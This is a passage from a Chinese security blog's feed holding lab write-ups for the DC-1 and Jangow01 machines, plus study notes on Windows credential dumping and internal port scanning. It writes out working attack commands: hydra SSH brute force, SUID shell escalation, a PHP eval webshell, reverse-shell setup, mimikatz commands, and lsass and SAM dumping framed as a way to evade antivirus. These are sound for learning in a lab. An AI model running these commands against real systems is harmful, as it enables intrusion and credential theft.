+<p>这里还有mysql 数据库的用户名密码</p>
+<p>连接数据库</p>
+<p>mysql -udbuser -pR0ck3t;</p>
+<figure data-type="image" tabindex="17"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409154759683.png" alt="image-20230409154759683" loading="lazy"></figure>
+<p>连接成功后看 我们网页drupal 用的数据表</p>
+<figure data-type="image" tabindex="18"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409155000641.png" alt="image-20230409155000641" loading="lazy"></figure>
+<p>select * from users; 找用户</p>
+<figure data-type="image" tabindex="19"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409155125765.png" alt="image-20230409155125765" loading="lazy"></figure>
+<p>这里admin 用户密码加密了 破解不了 我们这里采取直接改密码 因为密码是哈希加密过的 我们的密码也要是加密过</p>
+<figure data-type="image" tabindex="20"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409155404408.png" alt="image-20230409155404408" loading="lazy"></figure>
+<p>先退到网站目录下  然后生成哈希加密过的密码 我这里是fwl123</p>
+<p>然后再连接数据库 再用update命令更新密码</p>
+<figure data-type="image" tabindex="21"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409160354358.png" alt="image-20230409160354358" loading="lazy"></figure>
+<p>更新后回到网页登入 admin fwl123</p>
+<p>登入成功</p>
+<figure data-type="image" tabindex="22"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409162411610.png" alt="image-20230409162411610" loading="lazy"></figure>
+<p>得到flag3</p>
+<p>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</p>
+<p>特殊的PERMS将帮助查找passwd -但您需要-exec该命令来弄清楚如何获得阴影中的内容。</p>
+<p>根据flag3提示 cat  /etc/shadow<img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409163208779.png" alt="image-20230409163208779" loading="lazy"></p>
+<p>权限不够</p>
+<figure data-type="image" tabindex="23"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409163241104.png" alt="image-20230409163241104" loading="lazy"></figure>
+<p>cat /etc/passwd   发现flag4在/home 目录下</p>
+<p>且还有/bin/bash  联想到ssh连接 22端口</p>
+<p>但是密码不知道 我这里直接hydra爆破</p>
+<p><em>hydra</em> -l flag4 -P /usr/share/john/password.lst 192.168.131.130 ssh -vV -f</p>
+<p>其中-l表示指定爆破的用户，-P表示指定使用哪个密码字典，ip为DC1的ip，利用ssh协议做爆破</p>
+<figure data-type="image" tabindex="24"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409163807348.png" alt="image-20230409163807348" loading="lazy"></figure>
+<p>爆破成功 用户名flag4 密码 orange</p>
+<figure data-type="image" tabindex="25"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409163917599.png" alt="image-20230409163917599" loading="lazy"></figure>
+<p>ssh连接成功</p>
+<figure data-type="image" tabindex="26"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409163952561.png" alt="image-20230409163952561" loading="lazy"></figure>
+<p>ls 发现flag4.txt</p>
+<p>Can you use this same method to find or access the flag in root?</p>
+<p>您可以使用相同的方法来查找或访问根目录中的标志吗?</p>
+<p>根据提示，我们需要拿到root用户的权限，才能得到最终的flag</p>
+<h2 id="提权">提权</h2>
+<p>在这里我们使用suid提权</p>
+<p>关于suid提权 可以看这篇文章 <a href="https://blog.csdn.net/CP1024/article/details/123952966?ops_request_misc=%7B%22request%5Fid%22%3A%22168102995816800213049982%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168102995816800213049982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123952966-null-null.142%5Ev82%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&amp;utm_term=suid%E6%8F%90%E6%9D%83&amp;spm=1018.2226.3001.4187">Linux提权之SUID提权_linux 添加suid_反余弦函数的博客-CSDN博客</a></p>
+<p>find / -perm -4000 2&gt;/dev/null</p>
+<figure data-type="image" tabindex="27"><img src="https://img-blog.csdnimg.cn/e218c50852c54703b3974db6dca8d250.png" alt="img" loading="lazy"></figure>
+<p>发现_find_具有root权限。直接执行命令提权</p>
+<p>find -exec /bin/sh ;</p>
+<figure data-type="image" tabindex="28"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409164423114.png" alt="image-20230409164423114" loading="lazy"></figure>
+<figure data-type="image" tabindex="29"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230409164457151.png" alt="image-20230409164457151" loading="lazy"></figure>
+<p>到root目录下找到最后一个flag</p>
+<p>Well done!!!!</p>
+<p>Hopefully you've enjoyed this and learned some new skills.</p>
+<p>You can let me know what you thought of this little journey<br>
+by contacting me via Twitter - @DCAU7</p>
+<p>做得好! !</p>
+<p>希望你喜欢这篇文章，并学到了一些新技能。</p>
+<p>你可以让我知道你对这次小旅行的看法<br>
+通过推特@DCAU7联系我</p>
+<h2 id="总结">总结</h2>
+<p>做了很久 有很多不知道的地方 也是靠着百度一点一点做得</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[每周靶机渗透记录]]></title>
+        <id>https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu/</id>
+        <link href="https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu/">
+        </link>
+        <updated>2023-09-08T12:20:42.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="每周靶机渗透记录">每周靶机渗透记录</h1>
+<h2 id="环境配置">环境配置</h2>
+<p>dnh发的靶机 直接在vm上打开 一开始 kali搜不到它的ip</p>
+<p>改了一下配置就可以了</p>
+<h2 id="信息收集">信息收集</h2>
+<p>先判断出靶机的ip地址</p>
+<figure data-type="image" tabindex="1"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413181116584-16813878009083.png" alt="image-20230413181116584" loading="lazy"></figure>
+<p>192.168.131.132 访问ip</p>
+<figure data-type="image" tabindex="2"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413181151006.png" alt="image-20230413181151006" loading="lazy"></figure>
+<p>接下来nmap扫端口 看有没有可以利用的端口</p>
+<figure data-type="image" tabindex="3"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413181239266.png" alt="image-20230413181239266" loading="lazy"></figure>
+<p>发现 21端口 80端口打开</p>
+<p>21端口可以用ftp协议 但不知道用户密码 暂时用不上</p>
+<p>80端口访问发现</p>
+<figure data-type="image" tabindex="4"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413181541604.png" alt="image-20230413181541604" loading="lazy"></figure>
+<p>暂时不知道什么用 不过知道了他的版本号 Apache HTTP Server                                     2.4.18</p>
+<p>接下来扫目录</p>
+<p>这里用dirsearch扫</p>
+<figure data-type="image" tabindex="5"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413182420639.png" alt="image-20230413182420639" loading="lazy"></figure>
+<p>这里看到敏感目录 /.backup 直接去访问</p>
+<figure data-type="image" tabindex="6"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413182503469.png" alt="image-20230413182503469" loading="lazy"></figure>
+<pre><code>$servername = &quot;localhost&quot;;
+$database = &quot;jangow01&quot;;
+$username = &quot;jangow01&quot;;
+$password = &quot;abygurl69&quot;;
+</code></pre>
+<p>ftp连接</p>
+<figure data-type="image" tabindex="7"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413184011505.png" alt="image-20230413184011505" loading="lazy"></figure>
+<p>我这里连接成功有问题没回显了</p>
+<p>我换一台kali 成功了</p>
+<figure data-type="image" tabindex="8"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413184833327.png" alt="image-20230413184833327" loading="lazy"></figure>
+<p>然后就看看有没有可以用的信息</p>
+<figure data-type="image" tabindex="9"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413184910724.png" alt="image-20230413184910724" loading="lazy"></figure>
+<p>发现 php文件 html文件</p>
+<p>cat看看</p>
+<p>直接cat不行 先get 到本地上</p>
+<figure data-type="image" tabindex="10"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413185245150.png" alt="image-20230413185245150" loading="lazy"></figure>
+<p>发现是一句话 可以利用这个上传一句话木马</p>
+<figure data-type="image" tabindex="11"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413185422759.png" alt="image-20230413185422759" loading="lazy"></figure>
+<p>这里这个注入点之前其实就发现了 但没太注意</p>
+<figure data-type="image" tabindex="12"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413185508634.png" alt="image-20230413185508634" loading="lazy"></figure>
+<p>右上有个buscar点进去就是刚才那样</p>
+<figure data-type="image" tabindex="13"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413185530373.png" alt="image-20230413185530373" loading="lazy"></figure>
+<p>直接在该目录下写入一句话木马</p>
+<pre><code class="language-txt">echo '&lt;?php eval($_POST[&quot;a&quot;]);  ?&gt;' &gt;shell.php
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413190927801.png" alt="image-20230413190927801" loading="lazy"></figure>
+<p>可以看到上传成功</p>
+<figure data-type="image" tabindex="15"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413191710009.png" alt="image-20230413191710009" loading="lazy"></figure>
+<p>连接蚁剑成功</p>
+<p>上传了冰蝎马</p>
+<p>连接冰蝎</p>
+<figure data-type="image" tabindex="16"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413193410296.png" alt="image-20230413193410296" loading="lazy"></figure>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>然后uname -a 看版本号</p>
+<p>lsb_release  -a</p>
+<p>得到版本号 ubuntu 16.04</p>
+<p>然后去msf搜这个系统版本可以利用漏洞</p>
+<p>searchsploit ubuntu 16.04</p>
+<figure data-type="image" tabindex="17"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413193615854.png" alt="image-20230413193615854" loading="lazy"></figure>
+<p>cp /usr/share/exploitdb/exploits/linux/local/45010.c 桌面/shell2.c</p>
+<figure data-type="image" tabindex="18"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413193913704.png" alt="image-20230413193913704" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413193924186.png" alt="image-20230413193924186" loading="lazy"></figure>
+<p>然后直接通过冰蝎上传</p>
+<p>本想在冰蝎上直接执行这个发现冰蝎不行 那就监听去执行</p>
+<p>上传了反弹shell发现一直监听不到 上网查了 才知道 反弹shell不是直接就这么用的</p>
+<p>反弹shell 要先确定被攻击靶机哪个端口是可以开放监听的</p>
+<p>以下参考网上</p>
+<h3 id="反弹-shell-的建立">反弹 shell 的建立</h3>
+<h4 id="1-将-kali-所有端口绑定在同一个端口中">1. 将 kali 所有端口绑定在同一个端口中</h4>
+<pre><code>sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
+</code></pre>
+<p>然后我们使用 nc 对 1234 这个端口实行监听</p>
+<p>nc -lnvp 1234</p>
+<h4 id="2-编写-shell-检测哪些端口可用并上传-bash">2. 编写 shell 检测哪些端口可用并上传 bash</h4>
+<pre><code>for i in{1..65535};
+do
+	timeout 1 nc -vz 192.168.16.128 $i &amp;&amp; echo &quot;$i open&quot; &gt;&gt; out.txt || echo &quot;$i closed&quot; &gt;&gt; out.txt;
+done
+</code></pre>
+<p>然后我们即可上传该文件，文件名为 text_shell.bash 文件</p>
+<h4 id="3-利用任意命令执行漏洞去执行上传的-bash">3. 利用任意命令执行漏洞去执行上传的 bash</h4>
+<p>在进行这一步之前，确保 kali 的 ip 和 bash 一致，并且 kali 已经把所有端口绑定在同一个端口上；而且 nc 是正在监听中</p>
+<p>这里我们既可以在哥斯拉里面执行 bash，也可以通过这个 url 里面进行传参，bash text_shell.bash 去执行 shell 文件</p>
+<p>需要注意的一点是：我们上传 bash 文件之后，不一定能够执行，还需要我们去添加执行权限 chmod +x text_shell.bash</p>
+<h4 id="4-发现-443-可以用来作为反弹-shell">4. 发现 443 可以用来作为反弹 shell</h4>
+<h4 id="5-建立反弹-shell">5. 建立反弹 shell</h4>
+<p>kali (192.168.16.128) 监听本地的 1234 端口</p>
+<p>我这里也是成功监听</p>
+<figure data-type="image" tabindex="20"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413200018117.png" alt="image-20230413200018117" loading="lazy"></figure>
+<p>然后就是去执行之前上传的提权漏洞文件</p>
+<p>在这之前可以先输入python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'变交互式</p>
+<figure data-type="image" tabindex="21"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413200130179.png" alt="image-20230413200130179" loading="lazy"></figure>
+<p>进入 html 下的 site 目录 执行a.out</p>
+<figure data-type="image" tabindex="22"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413200335332.png" alt="image-20230413200335332" loading="lazy"></figure>
+<p>最后  whoami  发现是root</p>
+<p>提权成功</p>
+<p>直接去root 目录</p>
+<figure data-type="image" tabindex="23"><img src="E:%5C%E6%88%AA%E5%9B%BE%5Cimage-20230413200621300.png" alt="image-20230413200621300" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>这个靶机一开始做得很顺利以为挺简单的 后面监听不到 学到了反弹shell完整使用方法还有msf漏洞查到很多个具体使用哪个漏洞 和为什么选择这个漏洞还不太了解</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网学习day10]]></title>
+        <id>https://f9f.fun/post/nei-wang-xue-xi-day10/</id>
+        <link href="https://f9f.fun/post/nei-wang-xue-xi-day10/">
+        </link>
+        <updated>2023-08-22T14:08:21.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="内网学习day10">内网学习day10</h1>
+<h1 id="密码抓取技术">密码抓取技术</h1>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822184503989.png" alt="image-20230822184503989" loading="lazy"></figure>
+<h2 id="内网密码抓取技术概述">内网密码抓取技术概述</h2>
+<p>内网密码抓取技术在内网渗透中非常非常非常的重要，账号密码决定后续是否可以进行横向， 在内网渗透中有一个很重要的思路</p>
+<p><strong>抓取密码--&gt; 横向移动--&gt;抓取密码--&gt;横向移动</strong></p>
+<p>那么有哪些密码使我们关注的点呢？</p>
+<p>1、本地账号密码（或者hash）</p>
+<p>2、域账号密码（或者hash）</p>
+<p>3、RDP账号密码</p>
+<p>4、浏览器账号密码</p>
+<p>5、数据库账号密码</p>
+<p>6、本地保存账号密码文件</p>
+<h2 id="mimikatz等众多系统密码抓取工具介绍">Mimikatz等众多系统密码抓取工具介绍</h2>
+<p>读取电脑系统的账号密码或者Hash值的工具非常的多，我们介绍几个</p>
+<h3 id="1-getpassword">1、getpassword</h3>
+<p>打开GetPass工具所在的目录。打开命令行环境。运行64位程GetPassword。运行该程 序后,即可获得明文密码</p>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822190005185.png" alt="image-20230822190005185" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822185950396.png" alt="image-20230822185950396" loading="lazy"></figure>
+<h3 id="2-pwdump7">2、pwdump7</h3>
+<p>在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash</p>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822190517202.png" alt="image-20230822190517202" loading="lazy"></figure>
+<h3 id="3-quarkspwdump">3、QuarksPwDump</h3>
+<p>在命令行环境中输人QuarksPwDump.exe --dump-hash-local导出三个用户的NLMHash</p>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822192203347.png" alt="image-20230822192203347" loading="lazy"></figure>
+<h3 id="4-get-passhashesps1">4、GET-PASSHashes.ps1</h3>
+<h3 id="5-mimikatz">5、mimikatz</h3>
+<p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够 直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具， mimikatz可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行 哈希传递、票证传递或构建黄金票证</p>
+<p>项目地址https://github.com/gentilkiwi/mimikatz/</p>
+<p>常用模块和命令如下：</p>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822193519448.png" alt="image-20230822193519448" loading="lazy"></figure>
+<p>常用命令：<img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822193545832.png" alt="image-20230822193545832" loading="lazy"></p>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822193642786.png" alt="image-20230822193642786" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822193742003.png" alt="image-20230822193742003" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194036542.png" alt="image-20230822194036542" loading="lazy"></figure>
+<p>privilege::debug</p>
+<p>sekurlsa::msv</p>
+<h3 id="6-invoke-mimikatzps1">6、Invoke-Mimikatz.ps1</h3>
+<h3 id="7-cs自带工具">7、CS自带工具</h3>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194644344.png" alt="image-20230822194644344" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194625664.png" alt="image-20230822194625664" loading="lazy"></figure>
+<h3 id="8-msf工具">8、MSF工具</h3>
+<h2 id="电脑系统抓取密码的原理">电脑系统抓取密码的原理</h2>
+<p>本地认证的意思就是，我们的电脑上存储着自己的账号密码，无论电脑是否联网，只 要能开机，就可以输入账号密码登录到电脑中，工作组就是采用本地认证</p>
+<p>那么认证流程是什么样子呢？简单流程如下</p>
+<figure data-type="image" tabindex="12"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194803229.png" alt="image-20230822194803229" loading="lazy"></figure>
+<p>Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出.用 户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面</p>
+<figure data-type="image" tabindex="13"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194832860.png" alt="image-20230822194832860" loading="lazy"></figure>
+<p>lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策 略</p>
+<figure data-type="image" tabindex="14"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194839781.png" alt="image-20230822194839781" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194844865.png" alt="image-20230822194844865" loading="lazy"></figure>
+<p>SAM文件是位于C\windows\system32\config\目录下的，用于储存本地所有用户的凭证信息，但 是这并不代表着你可以随意去查看系统密码</p>
+<figure data-type="image" tabindex="16"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822194919915.png" alt="image-20230822194919915" loading="lazy"></figure>
+<h2 id="在线读取sam文件中的hash值">在线读取SAM文件中的Hash值</h2>
+<p>在线读取的意思就是，我们通过工具上传到目标的机器然后再直接读取机器 上的SAM文件中的内容，这里我们主要读取的NTLN-HASH值，有几个弊端</p>
+<p>1、上传的工具可能会被杀软杀掉</p>
+<p>2、工具因为网络问题传输可能不完整</p>
+<h3 id="方法一使用mimikatz上传工具到目标机器读取-使用mimikatz在线读取sam文件">方法一：使用mimikatz上传工具到目标机器读取 使用mimikatz在线读取Sam文件</h3>
+<p>分开的命令如下</p>
+<p>privilege::debug</p>
+<p>token::elevate</p>
+<p>lsadump::sam</p>
+<p>连起来</p>
+<p>mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam” exit</p>
+<figure data-type="image" tabindex="17"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822201003722.png" alt="image-20230822201003722" loading="lazy"></figure>
+<h3 id="方法二使用cs自带的工具导出-使用mimikatz在线读取sam文件">方法二：使用CS自带的工具导出 使用mimikatz在线读取Sam文件</h3>
+<figure data-type="image" tabindex="18"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822195727633.png" alt="image-20230822195727633" loading="lazy"></figure>
+<h2 id="离线读取sam文件中的hash值">离线读取SAM文件中的Hash值</h2>
+<p>离线读取的意思就是，我们不需要再本地读取，可以将SAM文件复制到我们自己的电脑上 然后使用工具读取，这里我们主要读取的NTLN-HASH值</p>
+<p>离线读取再一定程度上可以躲避杀软</p>
+<p>通过工具或者命令导出SAM文件</p>
+<p>1、通过reg命令导出</p>
+<p>reg save hklm\sam sam.hive</p>
+<p>reg save hklm\system system.hive</p>
+<p>2、使用PS（Copy-VSS）脚本</p>
+<p>powershell-import Copy-VSS.ps1   （导入）</p>
+<p>powershell Copy-VSS</p>
+<figure data-type="image" tabindex="19"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822202008246.png" alt="image-20230822202008246" loading="lazy"></figure>
+<p>把脚本导进cs里</p>
+<p>然后把sam文件下载到本地</p>
+<figure data-type="image" tabindex="20"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822202326755.png" alt="image-20230822202326755" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822202336449.png" alt="image-20230822202336449" loading="lazy"></figure>
+<p>名字要改成sam.hive system.hive</p>
+<p>下载过来名字变了</p>
+<figure data-type="image" tabindex="22"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822202851292.png" alt="image-20230822202851292" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822203200963.png" alt="image-20230822203200963" loading="lazy"></figure>
+<p>两个读出来是一样的</p>
+<h2 id="在线读取lsass进程内存密码">在线读取lsass进程内存密码</h2>
+<p>在线读取的意思就是，我们通过工具上传到目标的机器然后再直接读取机器上lsass内 存中的明文账号密码，这里我们主要读取的是明文</p>
+<p><strong>弊端</strong></p>
+<p>1、上传的工具可能会被杀软杀掉</p>
+<p>privilege::debug</p>
+<p>sekurlsa::msv 获取HASH (LM,NTLM)</p>
+<p>sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码</p>
+<p>sekurlsa::Kerberos 获取域管理员的明文密码</p>
+<p>sekurlsa::tspkg 通过tspkg读取明文密码</p>
+<p>sekurlsa::livessp 通过livessp 读取明文</p>
+<p>sekurlsa::ssp 通过ssp 读取明文密</p>
+<p>sekurlsa::logonPasswords 通过以上各种方法读取明文密码</p>
+<p>低版本电脑可以读取到，高版本一般默认不会在内存中存明文密码</p>
+<h2 id="离线读取lsass进程内存密码">离线读取lsass进程内存密码</h2>
+<p>离线读取的意思就是，我们不需要再本地读取，可以将lsass内存导出，在本地读取器 上lsass内存中的明文账号密码，这里我们主要读取的是明文</p>
+<p>离线读取再一定程度上可以躲避杀软</p>
+<p>导出方式一</p>
+<p>使用任务管理器导出</p>
+<figure data-type="image" tabindex="24"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822215317456.png" alt="image-20230822215317456" loading="lazy"></figure>
+<p>导出方式二</p>
+<p>使用procdump 导出lsass.dmp文件, ProcDump 是一个命令行实用工具，其主要用途 是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转 储的应用程序,微软的一般不会被杀软杀掉</p>
+<p>命令：procdump.exe -accepteula -ma lsass.exe lsass.dm</p>
+<figure data-type="image" tabindex="25"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822215534197.png" alt="image-20230822215534197" loading="lazy"></figure>
+<p>导出方式三</p>
+<p>使用powershell的Out-MiniDump.ps1脚本</p>
+<p>命令：</p>
+<p>powershell-import Out-MiniDump.ps1</p>
+<p>powershell Get-Process lsass | Out-Minid</p>
+<figure data-type="image" tabindex="26"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822220235635.png" alt="image-20230822220235635" loading="lazy"></figure>
+<p>导出方式四</p>
+<p>comsvcs.dll，系统自带。通过comsvcs.dll的导出函数MiniDump实现dump内存</p>
+<p>命令：</p>
+<p>1、首先查看lsass.exe进程PID: tasklist | findstr lsass.exe</p>
+<p>2、使用powershell导出rundll32 C:\windows\system32\comsvcs.dll, MiniDump476 C:\Users\Administrator\Desktop\lsass.dmp ful</p>
+<p>针对导出的文件进行读取</p>
+<p>命令： mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full</p>
+<figure data-type="image" tabindex="27"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822220700135.png" alt="image-20230822220700135" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网学习day9]]></title>
+        <id>https://f9f.fun/post/nei-wang-xue-xi-day9/</id>
+        <link href="https://f9f.fun/post/nei-wang-xue-xi-day9/">
+        </link>
+        <updated>2023-08-22T10:43:17.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="内网学习day9">内网学习day9</h1>
+<h1 id="内网端口扫描">内网端口扫描</h1>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822180013902.png" alt="image-20230822180013902" loading="lazy"></figure>
+<h2 id="内网端口扫描概述">内网端口扫描概述</h2>
+<p>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服 务的涌洞、分析目标网络的拓扑结构等， 在进行内网渗测试时，通常会使用Metasploit内置的端 口进行扫描。也可以上传端口扫描工具，使用工具进行扫描。还可以根据服务器的环境，使用自 定义的端口扫描脚本进行扫描。在获得授权的情况下，可以直接使用Nmap、masscan等端口扫 描工具获取开放的端口信息</p>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822180058208.png" alt="image-20230822180058208" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822180108276.png" alt="image-20230822180108276" loading="lazy"></figure>
+<h2 id="scanline端口扫描">ScanLine端口扫描</h2>
+<p>ScanLine是一款windows下的端口扫描的命令行程序。它可以完成PING扫描、TCP端口扫描、 UDP端口扫描等功能。运行速度很快，不需要winPcap库支持，应用场合受限较少。</p>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822181104574.png" alt="image-20230822181104574" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822181119417.png" alt="image-20230822181119417" loading="lazy"></figure>
+<h3 id="常用方法">常用方法：</h3>
+<p>scanline.exe -bhpt 21-23,25,80,110,135139,143,443,445,1433,1521,3306 IP</p>
+<p>scanline.exe -bhpt 80,443 1.1.1-254(IP)</p>
+<p>scanline.exe -bhpt 139,445 IP</p>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822181349242.png" alt="image-20230822181349242" loading="lazy"></figure>
+<h2 id="telnet端口扫描">Telnet端口扫描</h2>
+<p>Telnet协议是TCP/IP协议族的一员，是Internet远程登录服务的标准协议和主要方式。它为用 户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用Telnet协议，可以与 目标服务器建立连接。<strong>如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 telnet命令是最方便的</strong></p>
+<p>命令：</p>
+<p><strong>telnet + IP+端口</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822182253898.png" alt="image-20230822182253898" loading="lazy"></figure>
+<h2 id="kscan-fscan-工具端口扫描">Kscan、Fscan、工具端口扫描</h2>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822182825149.png" alt="image-20230822182825149" loading="lazy"></figure>
+<p>kscan_windows_amd64.exe -t 192.168.131.10 -p 1-65535</p>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822183032116.png" alt="image-20230822183032116" loading="lazy"></figure>
+<p>shell fscan64_1.6.exe -h 192.168.131.156 -p 1-65535</p>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230822183312189.png" alt="image-20230822183312189" loading="lazy"></figure>
